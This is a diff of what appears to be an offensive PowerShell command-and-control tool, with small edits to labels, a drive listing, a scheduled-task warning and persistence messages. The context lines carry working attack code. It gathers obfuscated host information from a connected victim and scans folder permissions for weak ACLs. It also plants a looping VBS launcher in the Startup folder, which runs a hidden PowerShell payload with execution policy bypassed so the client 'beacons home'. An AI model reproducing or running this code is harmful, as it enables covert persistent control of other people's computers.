@@ -367,7 +367,7 @@ $serial = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SerialNum
 $syst_dir = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
 $Processor = Character_Obfuscation("(Get-WmiObject Win32_processor).Caption");
 
-$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor";
+$Command = "`"`n   RHost         : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor";
 
 
 While($Client.Connected)
@@ -506,8 +506,8 @@ While($Client.Connected)
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;Write-Host "`n`n";
           If(-not ($Attrib) -or $Attrib -eq " "){$Attrib = "F"};
-          If(-not ($RfPath) -or $RfPath -eq " "){$RfPath = "$env:programfiles"};
           If(-not ($User_Attr) -or $User_Attr -eq " "){$User_Attr = "Everyone:"};
+          If(-not ($RfPath) -or $RfPath -eq " "){$RfPath = "$env:programfiles";write-host " Path Sellected: $RfPath"};
           $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"$User_Attr`"|findstr /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ $User_Attr($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
        }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
@@ -542,7 +542,7 @@ While($Client.Connected)
       If($choise -eq "ListDriv" -or $choise -eq "driv")
       {
         write-host " List of Remote-Host Drives Available." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-        $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Name,Provider,Root|Format-Table `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Name,Used,Free,Root|Format-Table `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
       }
       If($choise -eq "StartUp" -or $choise -eq "start")
       {
@@ -557,6 +557,10 @@ While($Client.Connected)
       }
       If($choise -eq "ListTask" -or $choise -eq "task")
       {
+        write-host "`n   Warnning" -ForegroundColor Yellow;
+        write-host "   --------";
+        write-host "   In some targets schtasks service is configurated";
+        write-host "   To not run any task IF connected to the battery";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     -------";
         write-host "   Check     Retrieve Schedule Tasks         Client:User  - Privileges Required";
@@ -930,8 +934,8 @@ While($Client.Connected)
           Write-Host "   -------               -----------";
           Write-Host "   $payload_name.ps1  `$env:tmp\$payload_name.ps1";
           Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
-          Write-Host "   Persistence LogFile: $logfile (Locally)" -ForeGroundColor yellow;
-          Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (loop)." -ForeGroundColor yellow;
+          Write-Host "   Persistence LogFile:  $logfile (Local Machine)" -ForeGroundColor yellow;
+          Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (infinite loop)." -ForeGroundColor yellow;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
           #$Command = Variable_Obfuscation(Character_Obfuscation($Command));
           ## Writing persistence setting into beacon.log local file ..
